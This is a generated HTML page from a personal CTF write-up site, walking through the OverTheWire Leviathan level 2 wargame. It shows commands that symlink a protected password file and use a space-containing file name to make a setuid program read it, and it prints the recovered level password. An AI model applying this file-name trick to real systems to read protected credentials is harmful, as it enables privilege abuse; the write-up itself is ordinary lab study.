@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>leviathan2 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="leviathan2" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/leviathan/leviathan2.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/leviathan/leviathan2.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="leviathan2" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"leviathan2","url":"http://localhost:4000/CTF_writeups/overthewire/leviathan/leviathan2.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>we will create link file for the password file in the name “link”
+<code class="language-plaintext highlighter-rouge">ln -sf /etc/leviathan_pass/leviathan3 link</code>.
+then, we will create file which named “link bla”.
+<code class="language-plaintext highlighter-rouge">touch "link bla"</code>
+and then, we’ll execute the printfile with our file:
+<code class="language-plaintext highlighter-rouge">~/printfile "link bla"</code>.
+also, we need to change the permission of our directory, that the user leviathan3 will be able to access files.
+<code class="language-plaintext highlighter-rouge">chmod +x .</code></p>
+
+<p>the exploit based on the fact that the access function returns 0 for the file “link bla”, because it’s fine.</p>
+
+<p>however, it than execute <code class="language-plaintext highlighter-rouge">/bin/cat link file</code>, which divided to 2 different commands.</p>
+
+<p><img src="/CTF_writeups/overthewire/leviathan/images/level2.png" alt="alt text" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">f0n8h2iWLP</code></em></strong></p>
+
+      </section>
+    </div>
+  </body>
+</html>
